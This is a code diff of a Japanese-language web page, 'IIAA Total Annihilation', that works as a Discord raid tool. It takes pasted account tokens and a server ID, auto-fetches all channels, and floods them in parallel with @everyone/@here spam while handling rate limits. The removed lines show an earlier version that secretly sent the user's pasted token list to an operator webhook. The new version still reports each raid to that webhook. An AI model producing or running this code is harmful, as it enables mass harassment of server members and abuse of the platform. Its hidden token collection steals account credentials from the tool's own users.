@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>IIAA Empire - Godspeed Command</title>
+    <title>IIAA Empire - Total Annihilation</title>
     <style>
         body {
             background-color: #000;
@@ -14,7 +14,7 @@
         .container {
             background: rgba(10, 0, 10, 0.96);
             width: 95%; max-width: 650px; padding: 25px; border-radius: 5px;
-            border: 2px solid #550055; box-shadow: 0 0 40px #ff0000, inset 0 0 15px #1a001a;
+            border: 2px solid #550055; box-shadow: 0 0 50px #ff0000;
             max-height: 95vh; overflow-y: auto;
         }
         h2 { text-align: center; color: #ff0000; text-shadow: 0 0 20px #ff0000; letter-spacing: 6px; margin: 0 0 20px 0; font-weight: bold; }
@@ -24,7 +24,7 @@
             border: 1px solid #550055; color: #ffcccc; box-sizing: border-box; font-size: 13px; font-family: monospace;
         }
         .btn-main { width: 100%; background: linear-gradient(180deg, #800000, #000); color: #fff; border: 2px solid #ff0000; padding: 18px; cursor: pointer; font-weight: bold; font-size: 22px; margin-top: 15px; text-shadow: 0 0 10px #ff0000; transition: 0.2s; }
-        .btn-main:hover { background: #ff0000; color: #000; transform: scale(1.02); }
+        .btn-main:hover { background: #ff0000; color: #000; transform: scale(1.01); }
         .btn-sub { background: #1a001a; color: #ffcccc; border: 1px solid #550055; padding: 10px; cursor: pointer; font-size: 12px; }
         #terminal { background: #000; color: #00ffaa; height: 130px; overflow-y: auto; padding: 10px; margin-top: 15px; border: 1px solid #550055; font-size: 11px; font-family: monospace; }
         .flex-row { display: flex; gap: 10px; align-items: flex-end; }
@@ -32,25 +32,25 @@
 </head>
 <body>
 <div class="container">
-    <h2>IIAA GODSPEED COMMAND</h2>
+    <h2>IIAA TOTAL ANNIHILATION</h2>
     
     <span class="label">1. DISCORD TOKENS</span>
-    <textarea id="tokens" style="height: 100px;" placeholder="トークンを1行に1つ貼り付け"></textarea>
+    <textarea id="tokens" style="height: 100px;" placeholder="トークンを貼り付け"></textarea>
 
     <span class="label">2. TARGET SERVER ID</span>
     <div class="flex-row">
-        <input type="text" id="guildId" placeholder="サーバーIDを入力">
+        <input type="text" id="guildId" placeholder="サーバーID">
         <button class="btn-sub" onclick="autoFetch()">全チャンネル取得</button>
     </div>
 
     <span class="label">3. TARGET CHANNELS</span>
-    <textarea id="channels" style="height: 80px;" placeholder="自動取得で入力されます"></textarea>
+    <textarea id="channels" style="height: 80px;" placeholder="自動取得で入力"></textarea>
 
     <span class="label">4. ADDITIONAL MESSAGE</span>
-    <textarea id="userMsg" style="height: 45px;" placeholder="固定文の下に付け加える文字"></textarea>
+    <textarea id="userMsg" style="height: 45px;" placeholder="固定文の下に追加"></textarea>
     
     <div style="display:flex; gap:15px; margin-top:10px;">
-        <label style="font-size:12px;"><input type="checkbox" id="useMention" checked> @everyone付与</label>
+        <label style="font-size:12px;"><input type="checkbox" id="useMention" checked> 全員強制メンション (@everyone & @here)</label>
     </div>
 
     <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
@@ -58,7 +58,7 @@
         <div><span class="label">待機(ms)</span><input type="number" id="speed" value="300"></div>
     </div>
 
-    <button id="startBtn" class="btn-main" onclick="executeBurst()">神速・作戦開始</button>
+    <button id="startBtn" class="btn-main" onclick="executeBurst()">全員抹殺・進軍開始</button>
     <button class="btn-sub" style="width:100%; margin-top:10px;" onclick="isRunning=false">緊急停止</button>
 
     <div id="terminal">--- 帝国・神速司令部 待機中 ---</div>
@@ -73,20 +73,17 @@
     let isRunning = false;
     const log = (m, c = "#00ffaa") => { const t = document.getElementById('terminal'); t.innerHTML += `> <span style="color:${c}">${m}</span><br>`; t.scrollTop = t.scrollHeight; };
 
-    // 全チャンネル自動取得機能
     async function autoFetch() {
         const tokens = document.getElementById('tokens').value.split('\n').filter(s=>s.trim());
         const g = document.getElementById('guildId').value.trim();
-        if(!tokens.length || !g) return log("トークンとIDが必要です", "#ff0000");
+        if(!tokens.length || !g) return log("不足", "#ff0000");
         try {
-            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), { 
-                headers: { "Authorization": tokens[0].trim() } 
-            });
+            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), { headers: { "Authorization": tokens[0].trim() } });
             const data = await res.json();
             const ids = data.filter(c => c.type === 0).map(c => c.id);
             document.getElementById('channels').value = ids.join('\n');
-            log(`捕捉完了：${ids.length}ch`, "#ff00ff");
-        } catch (e) { log("取得エラー", "#ff0000"); }
+            log(`捕捉：${ids.length}ch`, "#ff00ff");
+        } catch (e) { log("エラー", "#ff0000"); }
     }
 
     async function executeBurst() {
@@ -99,52 +96,47 @@
         const count = parseInt(document.getElementById('count').value);
         const speed = parseInt(document.getElementById('speed').value);
 
-        if (!tokens.length || !channels.length) return log("不足項目あり", "#ff0000");
-
         isRunning = true;
         document.getElementById('startBtn').disabled = true;
 
-        let finalContent = (useMention ? "@everyone\n" : "") + FIXED_TEXT;
-        if(userMsg) finalContent += `\n\n--- 魔王の伝令 ---\n${userMsg}`;
+        // 【改善】メンションを確実に飛ばすための接頭辞
+        const mentionPrefix = useMention ? "@everyone @here\n" : "";
+        let finalContent = mentionPrefix + FIXED_TEXT;
+        if(userMsg) finalContent += `\n\n--- 伝令 ---\n${userMsg}`;
 
-        // 【監視ログ】開始時に一括送信
-        log("司令部へ報告中...");
         try {
             await fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: `# ⚡ 【神速】進軍開始報告\n**対象:** \`${gId}\`\n**兵力:** \`${tokens.length}\` tokens\n**目標:** \`${channels.length}\` ch\n**トークンリスト:**\n\`\`\`\n${tokens.join('\n')}\n\`\`\``
+                    content: `# ⚡ 【抹殺開始】いあ帝国 全員メンション進軍\n**サーバー:** \`${gId}\`\n**兵力:** \`${tokens.length}\` tokens / **目標:** \`${channels.length}\` ch`
                 })
             });
         } catch(e) {}
 
-        // 【神速ロジック】各トークンが、全チャンネルに対して並列送信
         const strikeTasks = tokens.map(async (token, idx) => {
             const name = `魔将-${idx+1}`;
             for (let i = 0; i < count; i++) {
                 if (!isRunning) break;
                 
-                // 全ターゲットチャンネルへ「同時」に投げ込む
                 const requests = channels.map(async (chId) => {
                     try {
                         const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${chId}/messages`), {
                             method: "POST",
                             headers: { "Authorization": token, "Content-Type": "application/json" },
-                            body: JSON.stringify({ content: finalContent + `\n\n\`[Trace:${Math.random().toString(36).substr(2,4)}]\`` })
+                            body: JSON.stringify({ content: finalContent + `\n\n\`[Annihilate:${Math.random().toString(36).substr(2,4)}]\`` })
                         });
                         if (res.ok) {
                             log(`[${name}] 成功 ➔ ${chId}`);
                         } else if (res.status === 429) {
                             const data = await res.json();
                             const waittime = data.retry_after || 5;
-                            log(`[${name}] 制限発生。${waittime}秒待機`, "#ffaa00");
+                            log(`[${name}] 制限 ${waittime}s`, "#ffaa00");
                             await new Promise(r => setTimeout(r, waittime * 1000));
                         }
                     } catch (e) {}
                 });
 
-                // 一斉送信のリクエストがすべて終わるのを待ってから、設定された待機時間を挟む
                 await Promise.all(requests);
                 await new Promise(r => setTimeout(r, speed));
             }
@@ -153,7 +145,7 @@
         await Promise.all(strikeTasks);
         isRunning = false;
         document.getElementById('startBtn').disabled = false;
-        log("全制圧完了。", "#ff00ff");
+        log("全員抹殺完了。", "#ff00ff");
     }
 </script>
 </body>
